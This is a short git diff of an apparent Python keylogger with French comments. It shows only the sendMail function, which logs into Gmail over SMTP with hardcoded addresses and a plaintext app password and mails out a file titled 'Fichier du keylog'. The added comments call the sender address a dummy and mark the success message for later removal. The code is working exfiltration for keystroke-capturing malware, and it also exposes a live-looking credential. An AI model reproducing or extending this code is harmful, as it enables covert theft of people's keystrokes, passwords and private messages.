@@ -9,8 +9,8 @@ def sendMail():
     #Configuration pour l'envoi de mail
     port=465
     smtp_server="smtp.gmail.com"
-    sender_email="amazonoussama640@gmail.com"
-    receiver_email="oussamaau123@gmail.com"
+    sender_email="amazonoussama640@gmail.com" #adresse mail bidon d'où le mail va être envoyé
+    receiver_email="oussamaau123@gmail.com" #adresse mail sur laquelle on veut recevoir le mail
     password="tdcf hoql nrco flxv"
     objet="Fichier du keylog"
     corps="Envoi du fichier keylog"
@@ -43,5 +43,5 @@ def sendMail():
         server.login(sender_email, password)
         server.sendmail(sender_email, receiver_email, message.as_string())
 
-    print("Le mail a été envoyé")
+    print("Le mail a été envoyé") # A enlever plus tard
 
